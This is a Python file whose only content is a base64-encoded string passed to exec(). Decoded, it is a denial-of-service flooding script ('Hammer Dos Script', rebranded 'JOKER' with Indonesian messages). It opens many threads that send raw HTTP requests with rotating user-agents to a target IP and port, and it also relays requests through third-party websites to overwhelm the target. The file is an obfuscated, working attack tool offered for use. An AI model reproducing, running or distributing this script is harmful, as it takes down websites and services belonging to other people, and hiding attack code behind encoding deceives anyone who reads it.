import base64
exec(base64.b64decode('IyEvdXNyL2Jpbi9weXRob24zCiMgLSotIGNvZGluZzogdXRmLTggLSotCiMvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vCiMvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vCiMvLy8vICAgICAgICAgICAgICAgICAgICAgICBfICAgICAgICAgICAgXyAgX18gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLy8vCiMvLy8vICAgICAgICAgICAgICAgICAgICAgIHwgfCAgICAgICAgICAoXykvIF98ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLy8vCiMvLy8vICAgICAgICAgICAgICAgICAgIF9fX3wgfF8gICBfICBfX18gX3wgfF8gX19fIF8gX18gICAgICAgICAgICAgICAgICAgICAvLy8vCiMvLy8vICAgICAgICAgICAgICAgICAgfF8gIC8gfCB8IHwgfC8gX198IHwgIF8vIF8gXCAnX198ICAgICAgICAgICAgICAgICAgICAvLy8vCiMvLy8vICAgICAgICAgICAgICAgICAgIC8gL3wgfCB8X3wgfCAoX198IHwgfHwgIF9fLyB8ICAgICAgICAgICAgICAgICAgICAgICAvLy8vCiMvLy8vICAgICAgICAgICAgICAgICAgL19fX3xffFxfXyxffFxfX198X3xffCBcX19ffF98ICAgICAgICAgICAgICAgICAgICAgICAvLy8vCiMvLy8vICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLy8vCiMvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vCiMvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vCiMgU2NyaXB0IGluaSByZWNvZGUgZGFyaSAKIyBweXRob24gMy4zLjIrIEhhbW1lciBEb3MgU2NyaXB0IHYuMQoKCmZyb20gcXVldWUgaW1wb3J0IFF1ZXVlCmZyb20gb3B0cGFyc2UgaW1wb3J0IE9wdGlvblBhcnNlcgppbXBvcnQgdGltZSxzeXMsc29ja2V0LHRocmVhZGluZyxsb2dnaW5nLHVybGxpYi5yZXF1ZXN0LHJhbmRvbQppbXBvcnQgc3lzCmltcG9ydCBvcwppbXBvcnQgdGltZQppbXBvcnQgc29ja2V0CmltcG9ydCByYW5kb20KZGVmIHVzZXJfYWdlbnQoKToKCWdsb2JhbCB1YWdlbnQKCXVhZ2VudD1bXQoJdWFnZW50LmFwcGVuZCgiTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMCkgT3BlcmEgMTIuMTQiKQoJdWFnZW50LmFwcGVuZCgiTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCBpNjg2OyBydjoyNi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzI2LjAiKQoJdWFnZW50LmFwcGVuZCgiTW96aWxsYS81LjAgKFgxMTsgVTsgTGludXggeDg2XzY0OyBlbi1VUzsgcnY6MS45LjEuMykgR2Vja28vMjAwOTA5MTMgRmlyZWZveC8zLjUuMyIpCgl1YWdlbnQuYXBwZW5kKCJNb3ppbGxhLzUuMCAoV2luZG93czsgVTsgV2luZG93cyBOVCA2LjE7IGVuOyBydjoxLjkuMS4zKSBHZWNrby8yMDA5MDgyNCBGaXJlZm94LzMuNS4zICguTkVUIENMUiAzLjUuMzA3MjkpIikKCXVhZ2VudC5hcHBlbmQoIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMikgQXBwbGVXZWJLaXQvNTM1LjcgKEtIVE1MLCBsaWtlIEdlY2tvKSBDb21vZG9fRHJhZ29uLzE2LjEuMS4wIENocm9tZS8xNi4wLjkxMi42MyBTYWZhcmkvNTM1LjciKQoJdWFnZW50LmFwcGVuZCgiTW96aWxsYS81LjAgKFdpbmRvd3M7IFU7IFdpbmRvd3MgTlQgNS4yOyBlbi1VUzsgcnY6MS45LjEuMykgR2Vja28vMjAwOTA4MjQgRmlyZWZveC8zLjUuMyAoLk5FVCBDTFIgMy41LjMwNzI5KSIpCgl1YWdlbnQuYXBwZW5kKCJNb3ppbGxhLzUuMCAoV2luZG93czsgVTsgV2luZG93cyBOVCA2LjE7IGVuLVVTOyBydjoxLjkuMS4xKSBHZWNrby8yMDA5MDcxOCBGaXJlZm94LzMuNS4xIikKCXJldHVybih1YWdlbnQpCgoKZGVmIG15X2JvdHMoKToKCWdsb2JhbCBib3RzCglib3RzPVtdCglib3RzLmFwcGVuZCgiaHR0cDovL3ZhbGlkYXRvci53My5vcmcvY2hlY2s/dXJpPSIpCglib3RzLmFwcGVuZCgiaHR0cDovL3d3dy5mYWNlYm9vay5jb20vc2hhcmVyL3NoYXJlci5waHA/dT0iKQoJcmV0dXJuKGJvdHMpCgoKZGVmIGJvdF9oYW1tZXJpbmcodXJsKToKCXRyeToKCQl3aGlsZSBUcnVlOgoJCQlyZXEgPSB1cmxsaWIucmVxdWVzdC51cmxvcGVuKHVybGxpYi5yZXF1ZXN0LlJlcXVlc3QodXJsLGhlYWRlcnM9eydVc2VyLUFnZW50JzogcmFuZG9tLmNob2ljZSh1YWdlbnQpfSkpCgkJCXByaW50KCJcMDMzWzk0bUpPS0VSIG1lbmdoYW50YW0gbGF3YW4uLi5cMDMzWzBtIikKCQkJdGltZS5zbGVlcCguMSkKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKC4xKQoKCmRlZiBkb3duX2l0KGl0ZW0pOgoJdHJ5OgoJCXdoaWxlIFRydWU6CgkJCXBhY2tldCA9IHN0cigiR0VUIC8gSFRUUC8xLjFcbkhvc3Q6ICIraG9zdCsiXG5cbiBVc2VyLUFnZW50OiAiK3JhbmRvbS5jaG9pY2UodWFnZW50KSsiXG4iK2RhdGEpLmVuY29kZSgndXRmLTgnKQoJCQlzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQoJCQlzLmNvbm5lY3QoKGhvc3QsaW50KHBvcnQpKSkKCQkJaWYgcy5zZW5kdG8oIHBhY2tldCwgKGhvc3QsIGludChwb3J0KSkgKToKCQkJCXMuc2h1dGRvd24oMSkKCQkJCXByaW50ICgiXDAzM1s5Nm0iLHRpbWUuY3RpbWUodGltZS50aW1lKCkpLCJcMDMzWzBtIFwwMzNbOTJtIDwtLS08IEpPS0VSIG1lbnllcmFuZyBcMDMzWzBtIikKCQkJZWxzZToKCQkJCXMuc2h1dGRvd24oMSkKCQkJCXByaW50KCJcMDMzWzkxbUJlcmhlbnRpPC0+YWhcMDMzWzBtIikKCQkJdGltZS5zbGVlcCguMSkKCWV4Y2VwdCBzb2NrZXQuZXJyb3IgYXMgZToKCQlwcmludCgiXDAzM1s5MW1TZXJ2ZXIgdHVtYmFuZyEgSk9LRVIgbWVyZGVrYVwwMzNbMG0iKQoJCSNwcmludCgiXDAzM1s5MW0iLGUsIlwwMzNbMG0iKQoJCXRpbWUuc2xlZXAoLjEpCgoKZGVmIGRvcygpOgoJd2hpbGUgVHJ1ZToKCQlpdGVtID0gcS5nZXQoKQoJCWRvd25faXQoaXRlbSkKCQlxLnRhc2tfZG9uZSgpCgoKZGVmIGRvczIoKToKCXdoaWxlIFRydWU6CgkJaXRlbT13LmdldCgpCgkJYm90X2hhbW1lcmluZyhyYW5kb20uY2hvaWNlKGJvdHMpKyJodHRwOi8vIitob3N0KQoJCXcudGFza19kb25lKCkKCm9zLnN5c3RlbSgiY2xlYXIiKQpvcy5zeXN0ZW0oImZpZ2xldCBzZXJhbmdhbiIpCm9zLnN5c3RlbSgiZmlnbGV0IEpPS0VSIikKZGVmIHVzYWdlKCk6CglwcmludCAoJycnIFwwMzNbOTdtCQoJLWggOiBoZWxwCgktcyA6IGFsYW1hdCBpcCB0YXJnZXQKCS1wIDogcG9ydCB0YXJnZXQsIGNvbnRvaCA4MAoJLXQgOiB0dXJibyBkZWZhdWx0IG55YSAxMzUKCQptdWxhaSBzZXJhbmcgZGVuZ2FuIGtldGlrIDoKcHl0aG9uMyB3YXIucHkgWy1zXSBbLXBdIFstdF0KY29udG9oIDogcHl0aG9uMyB3YXIucHkgLXMgMTkyLjE2OC4wLjEgLXAgODAgLXQgMTM1XDAzM1swbScnJykKCgoKCXN5cy5leGl0KCkKCgpkZWYgZ2V0X3BhcmFtZXRlcnMoKToKCWdsb2JhbCBob3N0CglnbG9iYWwgcG9ydAoJZ2xvYmFsIHRocgoJZ2xvYmFsIGl0ZW0KCW9wdHAgPSBPcHRpb25QYXJzZXIoYWRkX2hlbHBfb3B0aW9uPUZhbHNlLGVwaWxvZz0iSGFtbWVycyIpCglvcHRwLmFkZF9vcHRpb24oIi1xIiwiLS1xdWlldCIsIGhlbHA9InNldCBsb2dnaW5nIHRvIEVSUk9SIixhY3Rpb249InN0b3JlX2NvbnN0IiwgZGVzdD0ibG9nbGV2ZWwiLGNvbnN0PWxvZ2dpbmcuRVJST1IsIGRlZmF1bHQ9bG9nZ2luZy5JTkZPKQoJb3B0cC5hZGRfb3B0aW9uKCItcyIsIi0tc2VydmVyIiwgZGVzdD0iaG9zdCIsaGVscD0iYXR0YWNrIHRvIHNlcnZlciBpcCAtcyBpcCIpCglvcHRwLmFkZF9vcHRpb24oIi1wIiwiLS1wb3J0Iix0eXBlPSJpbnQiLGRlc3Q9InBvcnQiLGhlbHA9Ii1wIDgwIGRlZmF1bHQgODAiKQoJb3B0cC5hZGRfb3B0aW9uKCItdCIsIi0tdHVyYm8iLHR5cGU9ImludCIsZGVzdD0idHVyYm8iLGhlbHA9ImRlZmF1bHQgMTM1IC10IDEzNSIpCglvcHRwLmFkZF9vcHRpb24oIi1oIiwiLS1oZWxwIixkZXN0PSJoZWxwIixhY3Rpb249J3N0b3JlX3RydWUnLGhlbHA9ImhlbHAgeW91IikKCW9wdHMsIGFyZ3MgPSBvcHRwLnBhcnNlX2FyZ3MoKQoJbG9nZ2luZy5iYXNpY0NvbmZpZyhsZXZlbD1vcHRzLmxvZ2xldmVsLGZvcm1hdD0nJShsZXZlbG5hbWUpLThzICUobWVzc2FnZSlzJykKCWlmIG9wdHMuaGVscDoKCQl1c2FnZSgpCglpZiBvcHRzLmhvc3QgaXMgbm90IE5vbmU6CgkJaG9zdCA9IG9wdHMuaG9zdAoJZWxzZToKCQl1c2FnZSgpCglpZiBvcHRzLnBvcnQgaXMgTm9uZToKCQlwb3J0ID0gODAKCWVsc2U6CgkJcG9ydCA9IG9wdHMucG9ydAoJaWYgb3B0cy50dXJibyBpcyBOb25lOgoJCXRociA9IDEzNQoJZWxzZToKCQl0aHIgPSBvcHRzLnR1cmJvCgoKIyByZWFkaW5nIGhlYWRlcnMKZ2xvYmFsIGRhdGEKaGVhZGVycyA9IG9wZW4oImhlYWRlcnMudHh0IiwgInIiKQpkYXRhID0gaGVhZGVycy5yZWFkKCkKaGVhZGVycy5jbG9zZSgpCiN0YXNrIHF1ZXVlIGFyZSBxLHcKcSA9IFF1ZXVlKCkKdyA9IFF1ZXVlKCkKCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgoJaWYgbGVuKHN5cy5hcmd2KSA8IDI6CgkJdXNhZ2UoKQoJZ2V0X3BhcmFtZXRlcnMoKQoJcHJpbnQoIlwwMzNbOTJtIixob3N0LCIgcG9ydDogIixzdHIocG9ydCksIiB0dXJibzogIixzdHIodGhyKSwiXDAzM1swbSIpCglwcmludCgiXDAzM1s5NG0gSk9LRVIgc2VkYW5nIG1lbmdpbnRhaSBtdXN1aC4uLi5cMDMzWzBtIikKCXVzZXJfYWdlbnQoKQoJbXlfYm90cygpCgl0aW1lLnNsZWVwKDUpCgl0cnk6CgkJcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKCQlzLmNvbm5lY3QoKGhvc3QsaW50KHBvcnQpKSkKCQlzLnNldHRpbWVvdXQoMSkKCWV4Y2VwdCBzb2NrZXQuZXJyb3IgYXMgZToKCQlwcmludCgiXDAzM1s5MW1KT0tFUiBTYWxhaCBzYXNhcmFuOiBDZWsgbGFnaSBpcCBhbmQgcG9ydCB0YXJnZXRcMDMzWzBtIikKCQl1c2FnZSgpCgl3aGlsZSBUcnVlOgoJCWZvciBpIGluIHJhbmdlKGludCh0aHIpKToKCQkJdCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWRvcykKCQkJdC5kYWVtb24gPSBUcnVlICAjIGlmIHRocmVhZCBpcyBleGlzdCwgaXQgZGllcwoJCQl0LnN0YXJ0KCkKCQkJdDIgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1kb3MyKQoJCQl0Mi5kYWVtb24gPSBUcnVlICAjIGlmIHRocmVhZCBpcyBleGlzdCwgaXQgZGllcwoJCQl0Mi5zdGFydCgpCgkJc3RhcnQgPSB0aW1lLnRpbWUoKQoJCSN0YXNraW5nCgkJaXRlbSA9IDAKCQl3aGlsZSBUcnVlOgoJCQlpZiAoaXRlbT4xODAwKTogIyBmb3Igbm8gbWVtb3J5IGNyYXNoCgkJCQlpdGVtPTAKCQkJCXRpbWUuc2xlZXAoLjEpCgkJCWl0ZW0gPSBpdGVtICsgMQoJCQlxLnB1dChpdGVtKQoJCQl3LnB1dChpdGVtKQoJCXEuam9pbigpCgkJdy5qb2luKCkKCg=='))